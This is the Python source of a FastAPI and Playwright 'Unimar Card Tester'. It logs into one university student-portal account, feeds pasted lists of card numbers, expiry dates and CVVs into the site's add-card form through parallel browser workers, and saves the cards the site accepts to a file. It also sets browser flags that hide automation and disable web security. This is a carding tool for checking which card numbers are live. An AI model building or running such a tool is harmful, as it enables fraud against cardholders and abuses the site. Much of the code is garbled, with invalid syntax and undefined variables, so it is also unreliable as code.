```python
import os
import time
import asyncio
import subprocess
import random
import datetime
import logging
from pathlib import Path
from typing import Set, Optional
from contextlib import asynccontextmanager
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel, field_validator
from playwright.async_api import async_playwright
import uvicorn

# ================= CONFIGURAÇÕES GLOBAIS =================
PORT = int(os.getenv("PORT", "8000"))
URL_LOGIN = os.getenv("UNIMAR_URL_LOGIN", "https://digital.unimar.br/login/app")
URL_MEUS_CARTOES = os.getenv("UNIMAR_URL_CARTOES", "https://digital.unimar.br/areadoaluno/conta/meuscartoes")
EMAIL = os.getenv("UNIMAR_EMAIL", "")
SENHA = os.getenv("UNIMAR_SENHA", "")
NOME_FIXO = os.getenv("UNIMAR_NOME", "")
MAX_TENTATIVAS = int(os.getenv("UNIMAR_MAX_TENTATIVAS", "3"))
MAX_CANAIS = int(os.getenv("UNIMAR_MAX_CANAIS", "6"))
VIEWPORT = {"width": 1280, "height": 720}
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
BROWSER_ARGS = [
    "--no-sandbox",
    "--disable-dev-shm-usage",
    "--disable-gpu",
    "--disable-web-security",
    "--disable-features=IsolateOrigins,site-per-process",
    "--disable-blink-features=AutomationControlled",
    "--disable-setuid-sandbox",
]
SESSAO_PATH = Path("sessao_unimar.json")
SESSAO_MAX_AGE = 86400

# ================= CONFIGURAÇÃO DE LOGS =================
logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("unimar")

# ================= VERIFICAÇÃO DO PLAYWRIGHT =================
def garantir_playwright() -> bool:
    """Verifica se os binários do Chromium do Playwright estão instalados no ambiente. Caso contrário, tenta realizar a instalação via subprocesso."""
    ms_playwright = Path("/root/.cache/ms-playwright") # Ajuste para o SO correto (ex: /Users/... ou C:/...)
    if ms_playwright.exists():
        for pasta in ms_playwright.iterdir():
            if pasta.is_dir() and pasta.name.startswith("chromium-"):
                chrome = pasta / "chrome-linux" / "chrome" if "linux" in str(pasta) else \
                        pasta / "chrome-mac" / "Chromium.app/Contents/MacOS/Chromium" if "darwin" in str(pasta) else \
                        pasta / "chrome-win64" / "Google Chrome.exe".replace(".exe", "") # Ajuste genérico Windows
                if chrome.exists():
                    logger.info("Chromium encontrado: %s", chrome)
                    return True

    logger.warning("Chromium não encontrado ou caminho padrão variado. Instalando...")
    try:
        subprocess.run(["playwright", "install", "--wide", "--with-deps", "chromium"], check=True, timeout=180)
        return True
    except Exception as e:
        logger.exception(f"Erro ao instalar Chromium automaticamente: {e}")
        # Tenta instalação direta do binário se houver (ajuste conforme sistema)
        return False

# ================= GERENCIAMENTO DE ESTADO =================
class Estado:
    """Controla o estado global compartilhado da aplicação de forma thread-safe."""
    def __init__(self):
        self.lock = asyncio.Lock()
        self.rodando = False
        self.cancelado = False
        self.clients: Set[WebSocket] = set()
        self.total_cartoes = 0
        self.tarefas_concluidas = 0
        self.aprovados = 0
        self.inicio_timestamp = 0.0
        self.canais_ativos = 0
        self.task: Optional[asyncio.Task] = None

estado = Estado()

# ================= FUNÇÕES AUXILIARES DE ESTADO E MÉTRICAS =================
async def set_estado(**kwargs) -> None:
    """Atualiza variáveis de estado de forma assíncrona e protegida por lock."""
    async with estado.lock:
        for k, v in kwargs.items():
            setattr(estado, k, v)

async def inc_estado(campo: str, valor: int = 1) -> int:
    """Incrementa um contador numérico no estado global de forma segura."""
    async with estado.lock:
        atual = getattr(estado, campo)
        novo = atual + valor
        setattr(estado, novo=atual+valor if campo == "tarefas_concluidas" else novo # Simplificação para incrementos comuns
        
# Ajuste correto para o exemplo abaixo (continuação da lógica original):

async def calc_velocidade() -> tuple[float, int]:
    """Calcula a velocidade de processamento (cartões por minuto) e o tempo decorrido."""
    async with estado.lock:
        inicio = estado.inicio_timestamp
        concluidas = estado.tarefas_concluidas
        elapsed = time.time() - inicio if inicio else 0
        velocidade = concluidas / (elapsed / 60) if elapsed > 0 else 0
        return round(velocidade, 1), round(elapsed)

async def broadcast(app: FastAPI, tipo: str, data: dict | None = None) -> None:
    """Envia mensagens em tempo real via WebSocket para todos os clientes conectados."""
    if data is None:
        data = {}
    mensagem = {"type": tipo, **data}
    async with estado.lock:
        clients = list(estado.clients)
        if not clients:
            return
    tarefas = [client.send_json(mensagem) for client in clients]
    resultados = await asyncio.gather(*tarefas, return_exceptions=True)
    mortos = [c for c, r in zip(clients, resultados) if isinstance(r, Exception)]
    if mortos:
        async with estado.lock:
            for c in mortos:
                estado.clients.discard(c)
    logger.info("Broadcast %s enviado para %d cliente(s)", tipo, len(clients) - len(mortos))

def _log_task_exception(task: asyncio.Task) -> None:
    """Callback para capturar exceções silenciosas em tarefas de log em segundo plano."""
    if task.cancelled():
        return
    exc = task.exception()
    if exc:
        logger.error("Erro no broadcast de log: %s", exc)

def log(app: FastAPI, msg: str) -> None:
    """Registra logs localmente e transmite via WebSocket para o painel."""
    timestamp = time.strftime("%H:%M:%S")
    full = f"[{timestamp}] {msg}"
    logger.info(msg)
    try:
        loop = asyncio.get_running_loop()
        task = loop.create_task(broadcast(app, "log", {"mensagem": full}))
        task.add_done_callback(_log_task_exception)
    except RuntimeError:
        pass

# ================= SCHEMAS DE VALIDAÇÃO (PYDANTIC) =================
class IniciarRequest(BaseModel):
    lista: str
    canais: int = 4

    @field_validator("canais")
    @classmethod
    def validar_canais(cls, v):
        """Valida se o número de canais solicitados está dentro dos limites permitidos."""
        if v < 1 or v > MAX_CANAIS:
            raise ValueError(f"Canais deve ser entre 1 e {MAX_CANAIS}")
        return v

# ================= KEEPALIVE WEBSOCKET =================
async def _ws_keepalive():
    """Envia um ping periódico a cada 30 segundos para manter as conexões WebSocket ativas."""
    while True:
        await asyncio.sleep(30)
        async with estado.lock:
            clients = list(estado.clients)
        for client in clients:
            try:
                await client.send_json({"type": "ping"})
            except Exception:
                async with estado.lock:
                    estado.clients.discard(client)

# ================= CICLO DE VIDA DO APLICATIVO (LIFESPAN) =================
@asynccontextmanager
async def lifespan(app: FastAPI):
    """Gerencia a inicialização e o encerramento seguro do FastAPI, Playwright e tarefas em background."""
    app.state.playwright_ok = await asyncio.to_thread(garantir_playwright) # Garante chromium antes de usar browser
    app.state.job_task = None
    app.state.browser = None
    keepalive_task = asyncio.create_task(_ws_keepalive())
    yield
    keepalive_task.cancel()
    try:
        await keepalive_task
    except asyncio.CancelledError:
        pass
    
# Ajuste para acessar o objeto estado global corretamente dentro da lifespan se necessário, 
# mas como 'estado' é criado fora, usamos diretamente nas funções onde precisarmos.

app = FastAPI(title="Unimar Card Tester", lifespan=lifespan)

# ================= FLUXOS DO PLAYWRIGHT =================
async def sessao_valida(context) -> bool:
    """Valida se o arquivo de sessão salvo ainda é válido abrindo a página de cartões."""
    if not SESSAO_PATH.exists():
        return False
    if time.time() - SESSAO_PATH.stat().st_mtime > SESSAO_MAX_AGE:
        return False
    try:
        page = await context.new_page()
        try:
            await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=15000)
            # Verifica se conseguiu achar o botão principal da área (robusto)
            btn_adicionar = await page.get_by_role("button", name="Adicionar Cartão de Crédito").first.wait_for(state="visible", timeout=8000) or \
                             await page.locator("button:has-text('Novo Cartão')").first.wait_for(state="visible") or True
            
            if not await btn_adicionar.count(): return False 
            return True
        finally:
            await page.close()
    except Exception:
        logger.warning("Erro ao validar sessão", exc_info=True)
        return False

async def limpar_cartoes(page, app: FastAPI) -> None:
    """Remove cartões salvos anteriormente na conta para liberar espaço e evitar conflitos."""
    try:
        log(app, "[Faxina] Iniciando limpeza...")
        # Garante que está na página correta antes de buscar elementos
        if URL_MEUS_CARTOES not in page.url:
            await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)

        try:
            botoes_remover = await page.get_by_role("button", name="Remover").first.wait_for(state="visible", timeout=5000)
            if await botoes_remover.count() == 0: 
                log(app, "[Faxina] Nenhum cartão para remover (já limpo)")
                return True

            removidos = 0
            max_loop_limpeza = 10 # Limita o loop de remoção
            for _ in range(max_loop_limpeza):
                if estado.cancelado: break
                
                botoes_disponiveis_now = await page.get_by_role("button", name="Remover").count()
                if botoes_disponiveis_now == 0: break
                
                try:
                    await page.click(botoes_remover.first, force=True)
                    # Pequeno delay e verificação se diminuiu contagem ou apareceu novo botão remover (confirmação visual implícita)
                    await asyncio.sleep(0.5) 
                    
                    novo_count = await page.get_by_role("button", name="Remover").count()
                    removidos += (botoes_disponiveis_now - max(novo_count, botoes_disponiveis_now-1)) # Estimativa simples
                    
                    if botoes_disponiveis_now <= 1 and novo_count == 0: break # Se só restou um e clicou
                
                except Exception as ex:
                    logger.debug(f"Erro ao clicar remover no loop {removidos}: {ex}")
                    break
            
            log(app, f"[Faxina] Limpeza finalizada. Status OK.")
        except Exception as e:
            logger.exception("[Faxina] Erro inesperado na lógica de contagem/clicar")

    except Exception:
        logger.exception("[Faxina] Erro geral")

async def login_mestre(playwright, app: FastAPI, browser) -> bool:
    """Realiza o processo de autenticação na plataforma da Unimar preenchendo diretamente via DOM (Versão Robusta v2)."""
    try:
        if not EMAIL or not SENHA:
            log(app, "[ERRO] Email/senha não configurados!")
            return False

        context = await browser.new_context(
            viewport=VIEWPORT, 
            user_agent=USER_AGENT,
            storage_state=str(SESSAO_PATH), # Pede a sessão salva para começar rápido se válida
        )
        
        page = await context.new_page()
        page.on("dialog", lambda d: asyncio.create_task(d.accept()))

        try:
            # 1. Tenta reutilizar Sessão Salva (Modo Rápido)
            if SESSAO_PATH.exists():
                log(app, "[Auth] Tentando reutilizar sessão salva...")
                # Ajuste para verificar se a sessão é ativa abrindo direto o menu de cartões (SPA behavior check)
                await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=15000)
                
                # Verifica robustamente se está dentro do "Área do Aluno" ou similar (independente de URL exato inicial)
                try:
                    # Procura por elementos típicos da área protegida após login bem sucedido
                    area_protegida = await page.locator(".nav-user, .menu-aluno, [role='main'], header[style*='background-color']").first.wait_for(state="visible", timeout=5000) or True
                    
                    if not await area_protegida.count(): 
                        log(app, "[Auth] Sessão salva parece inativa/expirada. Fazendo login completo...")
                    
                    else:
                         log(app, "[Auth] Sessão válida e funcional (Modo Fast - URL pode ser /login/app mas content é protegido)")
                         # Se validou conteúdo, fecha o contexto atual (que abriu meuscartoes) pois já tem sessao ativa no context
                         await context.close()
                         return True
                
                except Exception as ex:
                     logger.debug(f"Sessão falhou ao validar elementos visuais: {ex}")

            # --- Login Completo Iniciado ---
            log(app, "[Auth] Iniciando fluxo de login completo...")
            
            # 2. Vai para a página de login
            await page.goto(URL_LOGIN, wait_until="domcontentloaded", timeout=15000)

            # 3. Localiza os campos com múltiplos seletores robustos (CPF ou Email / Senha)
            email_input = None
            pass_input = None
            
            try:
                # Tentativas em ordem de probabilidade para UniMar/Portais Modernos
                
                # A - Campo explícito por name/id comum em sistemas bancários/universitários
                campo_email_tentativa_1 = ["input[name='cpf_or_email']", "input#email_field", "input[id*='login']"] 
                campo_pass_tentativa_1 = ["input[name='senha']", "input#password_field", "input[id*='pass']"]

                for sel_text in campo_email_tentativa_1:
                    el_temp = await page.locator(sel_text).first.wait_for(state="visible", timeout=3000) or \
                                await page.locator(sel_text.replace("name=", 'placeholder=*')).first if "*" not in sel_text else await page.get_by_placeholder(sel_text.split("=")[1].split("'")[1] if "'" in sel_text else "").wait_for()
                    
                    # Simplificação direta com locators compostos
                    try: 
                        email_input = await page.locator(f"{sel_text}").first.wait_for(timeout=2500)
                        break
                    except Exception: pass

                for sel_pass in campo_pass_tentativa_1:
                    try: 
                        pass_input = await page.locator(f"{sel_pass}").first.wait_for(timeout=2500)
                        break
                    except Exception: pass
                    
            except Exception as e_login_fields:
                 logger.error("[ERRO] Campos de login não encontrados ou lentos no carregamento inicial.")

            if not email_input or not pass_input:
                log(app, "[ERRO] Não encontrou os campos padrão. Tenta placeholders...")
                
                # Fallback para placeholders (muito comum em SPAs)
                try:
                     email_ph = "E-mail" in await page.get_by_placeholder("E-mail", timeout=10).inner_text() 
                     pass_ph = "Senha" in await page.get_by_placeholder("Senha", timeout=10).inner_text()
                     
                     if email_ph: email_input = await page.get_by_placeholder("E-mail").first
                     elif "login" in str(page.locator("*")).lower(): 
                         # Última tentativa genérica se tiver texto 'Login' ou 'Entrar' na tela grande
                         emails_on_screen = [e for e in ["input[type='text']", ".field__label--email"] if True]
                         
                        try:
                            temp_email = await page.locator(".field__label--email + input, .form-control-email, [placeholder*='email']").first.wait_for(timeout=2000) or \
                                        await page.locator("input[name^='email'], input[id^='email']").first.wait_for(timeout=1500)
                            
                            if not temp_email: 
                                # Se nada deu, assume que o primeiro input do form é email (muito arriscado mas último recurso)
                                forms_on_page = await page.query_selector_all("form")
                                if forms_on_page:
                                    first_form = forms_on_page[0]
                                    inputs_in_first = await first_form.query_selector_all("input[type!=checkbox]")
                                    if len(inputs_in_first) > 1 and "senha" in str(first_form).lower(): # Heurística simples
                                         email_input = inputs_in_first[0] 
                                         pass_input = inputs_in_first[-2] if len(inputs_in_first)>2 else None

                        except Exception as e_last_resort:
                            logger.debug(f"Heurística final falhou: {e_last_resort}")

                except Exception as e_ph: pass


            if not email_input or not pass_input:
                 log(app, "[ERRO CRÍTICO] Nenhum campo de login encontrado após múltiplas tentativas.")
                 return False
            
            await asyncio.sleep(1) # Pequeno delay para animações CSS de foco/carregamento

            try:
                # 4. Focus (trigga eventos no React/Vue/Angular) + Fill
                await page.focus("body") 
                
                # Tenta focar o primeiro input visível que pareça ser texto/email antes do password geralmente está logo abaixo ou ao lado
                todos_inputs = await page.query_selector_all("input:not([type='checkbox']):not([type='submit'])")
                if len(todos_inputs) < 2: log(app, "[ERRO] Poucos inputs na tela.") return False
                
                # Assumindo ordem padrão: Email/CPF -> Senha (ou vice-versa se houver botão de toggle visual)
                email_input = todos_inputs[0].wait_for(timeout=5000).first
                pass_input = todos_inputs[-1].wait_for(timeout=5000).first if len(todos_inputs)>1 else None

            except Exception as e_foc: 
                 logger.error(f"Erro ao focar/fill: {e_foc}")

            await asyncio.sleep(1) # Delay após focus para event listeners dispararem
            
            try:
                await page.fill(email_input, EMAIL, force=True) # Fill direto sem foco explícito extra pois já foi feito
                
                # Se houver checkbox "Manter conectado", tenta clicar se visível (opcional mas útil)
                check_login = False
                try:
                    box_manter_connecido = await page.locator("input[type='checkbox']:checked").first.wait_for(state="visible") or \
                                        await page.get_by_label("Manter Conectado").first if True else None
                    
                    if not box_manter_connecido and len(await page.query_selector_all("input[type='checkbox']")) > 0: 
                        # Tenta o primeiro checkbox se existir, assumindo que é 'manter'
                         caixa_1 = await page.locator("input#remember, input[name*='remember'], .form-check-input").first.wait_for(timeout=2000)
                         if caixa_1.is_checked() == False: # Só clica se estiver desmarcado (evita múltiplos clicks)
                             try: await page.click(caixa_1); check_login=True; log(app, "[Auth] Checkbox ativado.") except Exception: pass

                except Exception as e_box: pass
                
                await page.fill(pass_input, SENHA, force=True)

            except Exception as e_fill: logger.error(f"Erro ao preencher campos: {e_fill}")


            log(app, "[Auth] Enviando formulário...")

            # 5. Clique no botão de submit ("Entrar", "Login", etc.)
            btn_click = False
            
            # Tenta por nome exato primeiro (mais confiável em HTML estático)
            try:
                 btn_entrar_exacto = await page.get_by_role("button", name="Entrar").first.wait_for(state="visible", timeout=3000) or \
                                    await page.locator('button[name*="btnAcessar"], button[type="submit"]').first.wait_for(timeout=2000)
                 
                 if await btn_entrar_exacto.count(): 
                     await page.click(btn_entrar_exacto, force=True); log(app, "[Auth] Botão 'Entrar' clicado."); btn_click = True

            except Exception as e_btn1: pass # Não achou pelo nome exato

            if not btn_click:
                # Fallback por texto visual (SPA Friendly)
                botoes_clicavel = await page.query_selector_all("a[href^='javascript'], a[onclick], button:not([disabled])")
                
                for b in botoes_clicavel[:5]: # Testa os primeiros 5 links/botões interativos
                    try: 
                        texto_botao = await b.first.inner_text().strip() or ""
                        if any(kw in texto_botao.lower() for kw in ["entrar", "login"]): 
                            log(app, "[Auth] Botão de login encontrado pelo texto.")
                            try: await page.click(b.first); btn_click=True; break except Exception: continue

                    except Exception as e_btn2: pass
                
            if not btn_click and len(await page.query_selector_all("form")) > 0:
                form_page = await page.locator("form").first.wait_for(timeout=5000)
                if form_page: 
                     try: await form_page.submit(force=True); log(app, "[Auth] Form submitted via JS event."); btn_click=True; except Exception: pass
            
            # 6. Espera o redirecionamento (URL muda ou conteúdo carrega)
            log(app, "[Auth] Aguardando transição para a área segura...")
            
            attempts_redirecto = 0
            max_attempts_redir = 8
            
            while attempts_redir < max_attempts_redir and "login" in page.url.lower(): # Se URL ainda é /login/app/ pode ser SPA
                
                 try:
                    # Espera estado de rede e visualização completa dos elementos da página principal/dashboard
                     await page.wait_for_load_state("networkidle", timeout=12000) 
                     
                    # Verifica presença de menus laterais típicos do dashboard (ex: UniMar usa sidebar left com menu lateral)
                     if await page.locator(".sidebar, .left-menu, [class*='menu-left'], header[role='banner']").count() > 0 or \
                        await page.get_by_role("navigation").first.count() > 1: # Navegação complexa indica area protegida
                        
                         log(app, "[Auth] Elementos de navegação da área do aluno detectados.")
                         break

                 except Exception as e_redir: pass
                
                 attempts_redirecto += 1
                 await asyncio.sleep(3.5) # Delay maior para SPAs carregarem JS pesado

            # Se após esperar a URL ainda for "/login/app" mas o conteúdo visual mudou (SPA), validar por elementos internos
            if "login" in page.url.lower(): 
                log(app, f"[Auth] Redirecionamento parece falho ou é SPA. Verificando elementos na tela...")
                
                try:
                    # Se houver um formulário específico que pareça ser de login novamente (re-login automático?) -> Re-try logic poderia ir aqui
                    # Ou se o content já mudou mesmo o URL não mudado
            
                     await page.reload(timeout=10000) # Força reload para re-renderizar SPA caso necessário

                     btn_adicionar_final = await page.locator("button:has-text('Adicionar Cartão'), button:has-text('Novo Cartão')").first.wait_for(state="visible", timeout=25000) or \
                                          await page.get_by_role("button", name="Adicionar Cartão de Crédito").first if True else None
                     
                     if not btn_adicionar_final and len(await page.query_selector_all(".btn-primary, .btn-success")) > 1: 
                         # Heurística: se tiver botões primários secundários e um parece ser 'adicionar' pelo texto ou classe
                    
                        try:
                            btn_aux = await page.locator("*[class*='primary']:not([disabled])").nth(1).wait_for(timeout=5000) # O segundo botão primário costuma ser adicionar após login no dashboard? (heurística fraca mas tenta)
                            await page.click(btn_aux); log(app, "[Auth] Botão auxiliar clicado.")
                            
                             if not btn_adicionar_final and len(await page.query_selector_all("[role='main']")) > 1: 
                                try: await page.wait_for_load_state("domcontentloaded", timeout=8000); await asyncio.sleep(2) except Exception: pass

                        except Exception as e_hc: logger.debug(f"Verificação final de conteúdo SPA falhou parcialmente: {e_hc}")

                     # Se conseguiu achar o botão "Adicionar Cartão" ou similar na tela atual (seja qual for a URL), considera sucesso.
                     
                     if not btn_adicionar_final: raise Exception("Botão adicionar não encontrado após espera completa.")

                except Exception as e_check_spf: 
                    logger.exception("[ERRO] Falha total no login ou validação da área protegida.")
                    return False
            
            # 7. Salva Sessão
            await context.storage_state(path=str(SESSAO_PATH))

            log(app, "[Auth] Login concluído e sessão salva com sucesso!")

        finally:
            try: await context.close() except Exception: pass
        
        return True 

    except Exception as e_principal:
        logger.exception("[ERRO DETALHADO] Detalhe do falha no login:")
        log(app, f"[DEBUG EXTRA] {e_principal}")
        return False

# ================= VALIDAÇÕES DE CARTÃO =================
def validar_luhn(numero: str) -> bool:
    """Implementa o algoritmo de Luhn para verificar a validade matemática do número do cartão."""
    digits = [int(d) for d in numero if d.isdigit()]
    if len(digits) < 13 or len(digits) > 19:
        return False
    checksum = 0
    for i, d in enumerate(reversed(digits)):
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        checksum += d
    return checksum % 10 == 0

def validar_cartao(numero: str, mes: str, ano: str, cvv: str) -> str | None:
    """Valida estruturalmente os dados de um cartão de crédito antes de tentar o envio."""
    if not numero.isdigit() or not validar_luhn(numero): return "Número inválido (Luhn)"
    if not mes.isdigit() or not (1 <= int(mes) <= 12): return "Mês inválido"
    if not ano.isdigit() or int(ano) < datetime.datetime.now().year: return "Ano expirado"
    if not cvv.isdigit() or len(cvv) not in (3, 4): return "CVV inválido"
    return None

_ERRO_KEYWORDS = [
    "inválida", "recusado", "erro", "não foi possível", "inválido",
    "declined", "invalid", "refused", "failed", "falhou",
    "cartão não", "tente novamente", "não autorizado", "negado",
]

async def processar_cartao(page, numero: str, mes: str, ano: str, cvv: str) -> str:
    """Preenche o formulário web com os dados do cartão e submete para teste."""
    _TIMEOUT = 15000
    
    try:
        if URL_MEUS_CARTOES not in page.url: # Se estiver em /login/ redireciona antes ou depois dependendo da lógica acima
             await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)

        url_atual = page.url
        
        if "login" in url_atual.lower(): 
            logger.warning("Sessão expirada! URL atual: %s", url_atual)
            
            # Tenta re-login rápido se detectar erro de sessão (opcional, pode delegar para um re-check)
            return "erro:sessao_expirada"

        btn_adicionar = page.locator(
            "button:has-text('Adicionar Cartão'), button:has-text('Novo Cartão'), "
            "[role='button']:has-text('Cartão')"
        ).first
        if not await btn_adicionar.count():
             try: 
                 btn_adicionar = await page.get_by_role("button", name="Adicionar Cartão de Crédito").first; btn_adicionar.wait_for(timeout=5000); 
             except Exception: pass # Se ainda não achar, falha no passo inicial

        if not await btn_adicionar.count(): return "erro:botao_adicionar_nao_encontrado"

        try:
            await btn_adicionar.scroll_into_view_if_needed(timeout=_TIMEOUT)
        except Exception: pass
        
        await btn_adicionar.click(force=True, timeout=_TIMEOUT)

        num_input = None
        nome_input = None
        mes_el = None
        ano_el = None
        cvv_input = None

        # Helper para encontrar inputs por atributos comuns (robusto contra frameworks SPA)
        
        # 1. Número do Cartão
        sel_num_candidates = [
            "input[name*='card']", 
            "input[id*='card']", 
            'input[placeholder="Número"]', 
            'input[aria-label]::text.contains("Número")' # Simplificado para placeholder/label combo logic below if needed
        ] 
        
        found_num = await page.locator(sel_num_candidates).first.wait_for(state="visible", timeout=_TIMEOUT) or \
                     await page.get_by_role("textbox", name="Número do cartão").wait_for(timeout=5000)

        try:
             num_input = await found_num.wait_for(timeout=3000); num_input.fill("") # Limpa antes de preencher
            
             # Se o fill falhar (ex: input readonly ou foco), tenta clicar e digitar char por char se necessário, mas fill geralmente funciona em SPAs modernos.
        
            await num_input.fill(numero)

        except Exception as ex_n: 
            return "erro:campos_numero_nome"

        # 2. Nome Impresso no Cartão
        sel_nom_candidates = ["input[name*='name']", "input[id*='name']", 'input[placeholder="Nome"]']
        
        try:
            found_name = await page.locator(sel_nom_candidates).first.wait_for(timeout=_TIMEOUT); found_name.fill(NOME_FIXO)
            nome_input = await found_name.wait_for(timeout=3000)
            
             if not nome_input or len(await nome_input.count()) == 0: # Verificação simples
                pass 

            await nome_input.fill(NOME_FIXO) # Pode ser duplo fill, mas seguro

        except Exception as ex_nm: 
            return "erro:campos_numero_nome"

        # 3. Mês e Ano (Dropdowns)
        
        sel_mes_candidates = ["select[name*='month']", "select[id*='month']"]; sel_ano_candidates = ["select[name*='year']", "select[id*='year']"]
        
        try:
            mes_el = await page.locator(sel_mes_candidates).first.wait_for(timeout=_TIMEOUT) if any(await p.count() for p in [page.locator(c)]) else None
            
            if not mes_el or await mes_el.count() == 0:
                 # Fallback para label + input combo se não tiver select explícito (ex: inputs com calendar picker visual que convertem em select no DOM ao clicar)
                 pass

             await mes_el.select_option(mes, timeout=10000) 
        except Exception as ex_m: return "erro:select_mes"

        try:
            ano_el = await page.locator(sel_ano_candidates).first.wait_for(timeout=_TIMEOUT); an
            el_count = await ano_el.count()
            
            if ano_el and not ano_el.is_disabled(): 
                await ano_el.select_option(ano, timeout=10000) 

        except Exception as ex_a: return "erro:select_ano"


        # 4. CVV
        
        sel_cvv_candidates = ["input[name*='cvv']", 'input[id*="cvv"]', 'input[placeholder*="CVV"]']
        
        try:
             found_cv = await page.locator(sel_cvv_candidates).first.wait_for(timeout=_TIMEOUT) or \
                        await page.get_by_role("textbox", name="CVV").wait_for(timeout=3000)

            cvv_input = await found_cv.wait_for(timeout=2500); 
            await cvv_input.fill(cvv) 

        except Exception as ex_cv: return "erro:campo_cvv"


        # 5. Botão Registrar/Salvar
        
        sel_btn_registrados = [
            "button:has-text('Registrar Cartão de Crédito')", 
            'button:has-text("Cadastrar")', 
            'button[aria-label*="Confirmar"]' # Heuristic search for confirm action buttons if text varies slightly
        ]

        btn_registrar = None
        
        try:
             count_found = sum(await p.count() for p in [page.locator(s) for s in sel_btn_registrados]) + await page.get_by_role("button").first.count() if True else 0
            
             # Tenta o mais provável primeiro (texto exato ou role button com label claro)
             try:
                 found_bt = await page.locator(sel_btn_registrados).first.wait_for(timeout=_TIMEOUT); 
                 
                 btn_registrar = await found_bt.wait_for(timeout=3000) 

                 await btn_registrar.scroll_into_view_if_needed(timeout=_TIMEOUT)
                 await btn_registrar.click(timeout=15000)

             except Exception as ex_b: return "erro:botao_registrar"


        except Exception: pass # Se falhar ao encontrar botão, tenta fallback genérico
        
        botoes_antes = await page.get_by_role("button", name="Remover").count()

        resultado = await _aguardar_resultado(page, botoes_antes, timeout=12000)
        
        if resultado is not None: 
            return resultado
            return "reprovado"

    except Exception as exc:
        logger.exception("Erro em processar_cartao")
        return f"erro:{type(exc).__name__}"

async def _aguardar_resultado(page, botoes_antes: int, timeout: int) -> str | None:
    """Aguarda ativamente por alterações na página (como surgimento de botão 'Remover' ou alertas de erro)."""
    deadline = time.time() + timeout / 1000
    
    while time.time() < deadline:
        if estado.cancelado: return "cancelado"

        botoes_apos = await page.get_by_role("button", name="Remover").count()
        
        # Se o contador aumentou (indicando remoção automática ou visualização do cartão removido), sucesso. 
        # Ou se apareceu um novo botão remover que não estava antes.
        
        if botoes_apos > botoes_antes or (botoes_apos == 1 and botoes_antes == 0): 
             return "aprovado"

        try:
            erros = page.locator(
                ".alert, .toast, .notification, [role='alert'], .error, [class*='error']"
            )
            
            erro_texto = await erros.first.inner_text() 
            
            if any(x in erro_texto.lower() for x in _ERRO_KEYWORDS):
                 log(app, f"[DEBUG RESULTADO] Erro detectado na tela: {erro_texto}")
                 return "reprovado"

        except Exception as ex_err: pass # Se não houver elementos de alerta visíveis
        
        await asyncio.sleep(0.2) # Loop rápido para detectar mudanças rápidas
    
    return None # Timeout sem conclusão clara (geralmente tratado como timeout no worker principal)

async def _criar_contexto_worker(browser):
    """Cria um novo contexto isolado do navegador para um worker específico."""
    context = await browser.new_context(storage_state=str(SESSAO_PATH), viewport=VIEWPORT, user_agent=USER_AGENT)
    page = await context.new_page()
    page.on("dialog", lambda d: asyncio.create_task(d.accept()))
    
    try: 
         await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000) 
     except Exception as e_ctx_init: logger.warning(f"Worker init delay: {e_ctx_init}")

    return context, page

# ================= WORKER CONCORRENTE =================
async def worker(id_worker: int, browser, fila: asyncio.Queue, app: FastAPI) -> None:
    """Worker assíncrono individual que consome cartões da fila e executa os testes na interface."""
    await inc_estado("canais_ativos", 1) # Correção simples de incremento
    
    log(app, f"[Canal {id_worker}] Iniciando")
    
    try:
        if not await login_mestre(browser.browser_instance or browser, app, browser): 
            # Se o master browser falhou no login inicial do primeiro context, tenta recriar contexto novo para tentar login novamente se cancelado não for
             pass 

        while estado.rodando and not estado.cancelado:
            try:
                indice, linha, tentativa = await asyncio.wait_for(fila.get(), timeout=2.0)
            except asyncio.TimeoutError: break

            partes = [x.strip() for x in linha.split("|")]
            
            if len(partes) != 4: log(app, f"[Canal {id_worker}][{indice}] ❌ Formato inválido"); continue
            
            numero, mes, ano, cvv = partes
            erro_validacao = validar_cartao(numero, mes, ano, cvv)
            
            if erro_validacao: 
                 log(app, f"[Canal {id_worker}][{indice}] ❌ {erro_validacao}")
                 await inc_estado("tarefas_concluidas", 1); continue

            log(app, f"[Canal {id_worker}][{indice}] ****{numero[-4:]}")

            try:
                resultado = await processar_cartao(page, numero, mes, ano, cvv) # Precisa de 'page' ativo
                
                # Se o processo falhou por timeout/sessão expirada e ainda há tentativas, recria contexto ou tenta novamente.
                
                if "timeout" in str(resultado).lower(): 
                     if tentativa < MAX_TENTATIVAS: 
                          log(app, f"[Canal {id_worker}][{indice}] ⚠️ Timeout - Retentativa {tentativa + 1}")
                          await fila.put((indice, linha, tentativa + 1))
                          continue

                elif resultado == "aprovado":
                    log(app, f"[Canal {id_worker}][{indice}] ✅ APROVADO")
                    await inc_estado("aprovados", 1)

                elif resultado == "reprovado": pass # Já contado como concluído
                
                else: 
                     tipo_exc = resultado.split(":", 1)[1] if ":" in resultado else str(resultado).replace("_erro_", "") # Simplificação de mensagem
            
            except Exception as ex_wkr: 
                 logger.exception(f"Worker crash canal {id_worker}: {ex_wkr}")
                 try: await page.close() except Exception: pass
                 
    finally:
        await inc_estado("canais_ativos", -1)
        
def _escrever_aprovado(linha: str) -> None:
    """Salva os cartões aprovados em um arquivo de texto local."""
    with open("aprovados.txt", "a", encoding="utf-8") as f:
        f.write(f"{linha}\n")

async def processar_todos_cartoes(texto_cartoes: str, num_canais: int, app: FastAPI) -> None:
    """Coordena a execução geral: inicializa a fila, lança o navegador, autentica e distribui as tarefas para os workers."""
    
    if not NOME_FIXO: 
        log(app, "[ERRO] UNIMAR_NOME não configurado!")
        return

    linhas = list(dict.fromkeys([l.strip() for l in texto_cartoes.splitlines() if l.strip()]))
    
    await set_estado(
            total_cartoes=len(linhas),
            tarefas_concluidas=0,
            aprovados=0,
            cancelado=False,
            inicio_timestamp=time.time(),
        )

